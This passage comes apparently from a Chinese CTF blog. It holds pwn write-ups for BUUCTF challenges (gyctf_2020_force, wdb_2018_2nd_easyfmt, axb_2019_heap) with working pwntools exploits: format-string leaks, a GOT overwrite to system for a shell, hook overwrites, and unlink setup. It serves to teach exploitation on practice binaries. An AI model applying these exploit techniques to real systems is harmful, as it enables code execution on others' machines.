<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">realloc_data = one_gadget[<span class="number">1</span>] + libc_base</span><br><span class="line">malloc_data = realloc + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'aaaaaaaa'</span> + p64(realloc_data) + p64(malloc_data))</span><br></pre></td></tr></table></figure>
<h4 id="5-malloc-gt-getshell"><a href="#5-malloc-gt-getshell" class="headerlink" title="5.malloc =&gt; getshell"></a>5.malloc =&gt; getshell</h4><blockquote>
<p>执行一次malloc操作，即可get shell</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"puts"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"size"</span>)</span><br><span class="line">p.sendline(str(<span class="number">24</span>))</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>分配超过mmap阈值的堆块 =&gt; 经过mmap分配的地址，与libc有固定偏移 =&gt; 泄露libc地址</li>
<li>house of force</li>
<li>realloc调节栈帧</li>
</ol>
<h3 id="参考-amp-下载"><a href="#参考-amp-下载" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h3><p>参考博客：</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_44145820/article/details/105522043" target="_blank" rel="noopener">BUUCTF-PWN gyctf_2020_force（house of force）</a></li>
<li><a href="https://www.cnblogs.com/zhwer/p/14135734.html" target="_blank" rel="noopener">gyctf_2020_force | House of force</a></li>
</ul>
<p>下载：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">文件</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><a href="gyctf_2020_force">文件</a></td>
</tr>
<tr>
<td style="text-align:center"><a href="libc-2.23.so">LIBC</a></td>
</tr>
</tbody>
</table>
</div>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/25/23-34/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/25/23-34/" class="post-title-link" itemprop="url">wdb_2018_2nd_easyfmt详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-04-25 23:34:51 / 修改时间：23:36:25" itemprop="dateCreated datePublished" datetime="2021-04-25T23:34:51+08:00">2021-04-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>wdb_2018_2nd_easyfmt详解</p>
<p>自己做出来了，，，，还看其他人的</p>
<p>参考：<a href="[wdb_2018_2nd_easyfmt](https://www.cnblogs.com/luoleqi/p/13498183.html">wdb_2018_2nd_easyfmt</a>)</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>程序流程非常简单，可以一直进行格式化字符串漏洞。</p>
<p><img src="/2021/04/25/23-34/image-20210425225434398.png" alt="image-20210425225434398"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>首先通过格式化字符串泄露栈信息</li>
<li>通过格式化字符串修改printf_got表为system（one_gadget本地打通了，远程没有，，）</li>
<li>发送“/bin/sh\x00”，</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-查看基本信息"><a href="#0-查看基本信息" class="headerlink" title="0.查看基本信息"></a>0.查看基本信息</h4><p>32位程序，只开了nx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file wdb_2018_2nd_easyfmt </span><br><span class="line">wdb_2018_2nd_easyfmt: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;f86851c3576d0aabf0b0b2310d835d0f6e660eb8, not stripped</span><br><span class="line">winter@ubuntu:~&#x2F;buu$ checksec wdb_2018_2nd_easyfmt </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>格式化字符串，偏移为6</p>
<p><img src="/2021/04/25/23-34/image-20210425233348293.png" alt="image-20210425233348293"></p>
<h4 id="1-泄露信息"><a href="#1-泄露信息" class="headerlink" title="1.泄露信息"></a>1.泄露信息</h4><h5 id="方法一：栈上数据"><a href="#方法一：栈上数据" class="headerlink" title="方法一：栈上数据"></a>方法一：栈上数据</h5><blockquote>
<p>可以直接查看栈上的信息进行泄露</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ esp      0xffffcfbc —▸ 0x80485cf (main+132) ◂— add    esp, 0x10</span><br><span class="line">01:0004│          0xffffcfc0 —▸ 0xffffcfd8 ◂— &#39;aaaa\n&#39;</span><br><span class="line">... ↓</span><br><span class="line">03:000c│          0xffffcfc8 ◂— 0x64 &#x2F;* &#39;d&#39; *&#x2F;</span><br><span class="line">04:0010│          0xffffcfcc —▸ 0xf7e9379b (handle_intel+107) ◂— add    esp, 0x10	#libc中的数据，计算偏移即可得到libc基址</span><br><span class="line">05:0014│          0xffffcfd0 —▸ 0xffffcffe —▸ 0xffff0000 ◂— 0x0</span><br><span class="line">06:0018│          0xffffcfd4 —▸ 0xffffd0fc —▸ 0xffffd2e9 ◂— &#39;XDG_VTNR&#x3D;7&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"Do you know repeater?"</span>)</span><br><span class="line">payload = <span class="string">"%3$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">handle_intel_107 = p.recvuntil(<span class="string">"f7"</span>)[<span class="number">-2</span>:]</span><br><span class="line">handle_intel_107 += p.recv(<span class="number">8</span>)</span><br><span class="line">handle_intel_107 = int(handle_intel_107,<span class="number">16</span>)</span><br><span class="line">log.success(hex(handle_intel_107))</span><br><span class="line"></span><br><span class="line"><span class="comment">#[+] 0xf7e658fb</span></span><br></pre></td></tr></table></figure>
<p>通过脚本输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000 1000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt</span><br><span class="line">0xf7dd5000 0xf7dd6000 rw-p     1000 0      </span><br><span class="line">0xf7dd6000 0xf7f83000 r-xp   1ad000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f83000 0xf7f84000 ---p     1000 1ad000 &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f84000 0xf7f86000 r--p     2000 1ad000 &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f86000 0xf7f87000 rw-p     1000 1af000 &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f87000 0xf7f8b000 rw-p     4000 0      </span><br><span class="line">0xf7f8b000 0xf7f8e000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7f8e000 0xf7f90000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7f90000 0xf7fb3000 r-xp    23000 0      &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 r--p     1000 22000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 rw-p     1000 23000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0xff999000 0xff9ba000 rw-p    21000 0      [stack]</span><br></pre></td></tr></table></figure>
<p>计算偏移为：0xf7e658fb - 0xf7dd6000 = 0x8F8FB</p>
<p>故可以得到libc_base</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base &#x3D; handle_intel_107 - 0x8f8fb - 0x20	#0x20是因为远程的时候，发现好像有0x20的偏移，一般libc_base是000结尾，但是原来是020结尾,故猜测还要再减去0x20</span><br><span class="line">log.success(hex(libc_base))</span><br></pre></td></tr></table></figure>
<h5 id="方法二：直接泄露got表信息（方便）"><a href="#方法二：直接泄露got表信息（方便）" class="headerlink" title="方法二：直接泄露got表信息（方便）"></a>方法二：直接泄露got表信息（方便）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&quot;Do you know repeater?&quot;)</span><br><span class="line">payload &#x3D; p32(elf.got[&#39;printf&#39;]) + &quot;%6$s&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr &#x3D; u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">print(hex(printf_addr))</span><br><span class="line">libc_base &#x3D; printf_addr - libc.sym[&#39;printf&#39;]</span><br></pre></td></tr></table></figure>
<p>因为偏移是6，所以直接输入printf_got，输出该地址内容时候，就泄露了printf的地址。</p>
<h4 id="2-格式化字符串写printf-got"><a href="#2-格式化字符串写printf-got" class="headerlink" title="2.格式化字符串写printf_got"></a>2.格式化字符串写printf_got</h4><p>利用pwntool的工具来做</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; fmtstr_payload(offset,&#123;printf_got:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30wx 0x804a014</span><br><span class="line">0x804a014:	0xf7e3a940	0xf7e5f140	0xf7e18540	0xf7e60da0</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30wx 0xf7e3a940</span><br><span class="line">0xf7e3a940 &lt;system&gt;:	0x8b0cec83	0xe8102444	0x000e2941	0x56b4c281</span><br></pre></td></tr></table></figure>
<h4 id="3-发送”-bin-sh-x00”字符串"><a href="#3-发送”-bin-sh-x00”字符串" class="headerlink" title="3.发送”/bin/sh\x00”字符串"></a>3.发送”/bin/sh\x00”字符串</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br></pre></td></tr></table></figure>
<p>执行<code>printf(&amp;buf);</code> =&gt; system(“/bin/sh\x00”)</p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./wdb_2018_2nd_easyfmt")</span></span><br><span class="line">p=process([<span class="string">'./wdb_2018_2nd_easyfmt'</span>],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/buu/libc-2.23-32.so"</span>&#125;)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25745</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">elf = ELF(<span class="string">"./wdb_2018_2nd_easyfmt"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/home/winter/buu/libc-2.23-32.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil("Do you know repeater?")</span></span><br><span class="line"><span class="comment"># payload = "%3$p"</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># handle_intel_107 = p.recvuntil("f7")[-2:]</span></span><br><span class="line"><span class="comment"># handle_intel_107 += p.recv(8)</span></span><br><span class="line"><span class="comment"># handle_intel_107 = int(handle_intel_107,16)</span></span><br><span class="line"><span class="comment"># log.success(hex(handle_intel_107))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = handle_intel_107 - 0x8f8fb - 0x20	#direct sub</span></span><br><span class="line"><span class="comment"># log.success(hex(libc_base))</span></span><br><span class="line">p.recvuntil(<span class="string">"Do you know repeater?"</span>)</span><br><span class="line">payload = p32(elf.got[<span class="string">'printf'</span>]) + <span class="string">"%6$s"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr = u32(p.recvuntil(<span class="string">"\xf7"</span>)[<span class="number">-4</span>:])</span><br><span class="line">print(hex(printf_addr))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">'printf'</span>]</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">log.success(hex(printf_got))</span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/25/15-11/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/25/15-11/" class="post-title-link" itemprop="url">axb_2019_heap详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-04-25 15:11:27 / 修改时间：15:12:52" itemprop="dateCreated datePublished" datetime="2021-04-25T15:11:27+08:00">2021-04-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>关于axb_2019_heap的详解</p>
<p>参考：<a href="https://blog.csdn.net/weixin_45677731/article/details/108763362" target="_blank" rel="noopener">buuctf  axb_2019_heap</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>banner：存在格式化字符串漏洞，可以泄漏栈上的信息</p>
</li>
<li><p>add：根据idx创建size（大于0x80）大小的内容为content的块</p>
<p>块指针和块大小存放在一个全局变量note中</p>
</li>
<li><p>delete：释放的很干净，没有uaf</p>
</li>
<li><p>edit：存在off by one</p>
<p><code>get_input(*((_QWORD *)&amp;note + 2 * v1), *((_DWORD *)&amp;note + 4 * v1 + 2));</code></p>
<p><code>if ( a2 + 1 &lt;= (unsigned int)v3 )</code>v3是以及输入的长度，a2是给定的长度，存在一个字节的溢出</p>
</li>
</ol>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><blockquote>
<p>这个程序没有保留调试信息，不能调试，只能一步步看，，，</p>
<p><a href="https://www.yanbinghu.com/2019/04/20/41283.html" target="_blank" rel="noopener">GDB调试指南</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reading symbols from axb_2019_heap...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li><p>利用格式化字符串泄露栈上信息</p>
<ul>
<li><p><code>__libc_start_main+240</code> =&gt; libc基地址</p>
</li>
<li><p>(main) ◂— push   rbp =&gt; 程序基地址</p>
</li>
</ul>
</li>
<li><p>由于存在全局变量note，故可以利用unlink控制chunk指针</p>
</li>
<li><p>修改__free_hook为system，get shell</p>
</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-格式化字符串"><a href="#1-格式化字符串" class="headerlink" title="1.格式化字符串"></a>1.格式化字符串</h4><blockquote>
<p>计算偏移：直接算或者用工具 =&gt; 得到偏移为7</p>
</blockquote>
<p><img src="/2021/04/25/15-11/image-20210425142716133.png" alt="image-20210425142716133"></p>
<blockquote>
<p>执行到<code>printf(&amp;format);</code></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x555555554b4e &lt;banner+105&gt;    call   printf@plt &lt;printf@plt&gt;</span><br><span class="line">       format: 0x7fffffffde4c ◂— &#39;aaaaaaaa&#39;</span><br><span class="line">       vararg: 0x7fffffffb7b0 ◂— &#39;Hello, our name:&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ rsp    0x7fffffffde40 ◂— 0x0</span><br><span class="line">01:0008│ rdi-4  0x7fffffffde48 ◂— 0x61616161ffffde60</span><br><span class="line">02:0010│        0x7fffffffde50 ◂— 0x550061616161 &#x2F;* &#39;aaaa&#39; *&#x2F;	#输入的数据</span><br><span class="line">03:0018│        0x7fffffffde58 ◂— 0xd23db0a55446d00</span><br><span class="line">04:0020│ rbp    0x7fffffffde60 —▸ 0x7fffffffde80 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15</span><br><span class="line">05:0028│        0x7fffffffde68 —▸ 0x555555555186 (main+28) ◂— mov    eax, 0</span><br><span class="line">06:0030│        0x7fffffffde70 —▸ 0x7fffffffdf60 ◂— 0x1</span><br><span class="line">07:0038│        0x7fffffffde78 ◂— 0x0</span><br><span class="line">08:0040│        0x7fffffffde80 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15</span><br><span class="line">09:0048│        0x7fffffffde88 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax	#可以泄露libc_base</span><br><span class="line">0a:0050│        0x7fffffffde90 ◂— 0x1</span><br><span class="line">0b:0058│        0x7fffffffde98 —▸ 0x7fffffffdf68 —▸ 0x7fffffffe2d3 ◂— &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;axb_2019_heap&#39;</span><br><span class="line">0c:0060│        0x7fffffffdea0 ◂— 0x1f7ffcca0</span><br><span class="line">0d:0068│        0x7fffffffdea8 —▸ 0x55555555516a (main) ◂— push   rbp	#main起始地址，可以泄露程序基地址</span><br></pre></td></tr></table></figure>
<p>所以<code>__libc_start_main+240</code>的偏移为15，<code>main</code>的偏移为19。</p>
<p>通过计算即可得到libc_base和程序基地址（开启了pie，每次都不一样）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"Enter your name: "</span>)</span><br><span class="line">payload = <span class="string">"%15$p.%19$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">main_240 = int(p.recvuntil(<span class="string">"."</span>)[<span class="number">-13</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">push_rbp = int(p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-13</span>:],<span class="number">16</span>)</span><br><span class="line">print(hex(main_240))</span><br><span class="line">print(hex(push_rbp))</span><br><span class="line"></span><br><span class="line">libc_base = main_240 - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">240</span></span><br><span class="line">pro_base = push_rbp - <span class="number">0x116a</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(pro_base))</span><br></pre></td></tr></table></figure>
<h4 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h4><blockquote>
<p>首先计算note地址 = 程序基地址 + note偏移 =&gt; <code>note = pro_base + 0x0202060</code></p>
<p>接着申请三个块，0x98大小（方便修改下一个chunk）</p>
<ul>
<li>第一个chunk：构造fake chunk</li>
<li>第二个chunk：用于释放，unlink</li>
<li>第三个chunk：防止第二个chunk和top chunk合并</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d656000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d6560a0</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d656140</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d6561e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x55830d656000</span><br><span class="line">0x55830d656000:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55830d656010:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x55830d656020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d6560a0:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55830d6560b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55830d6560c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
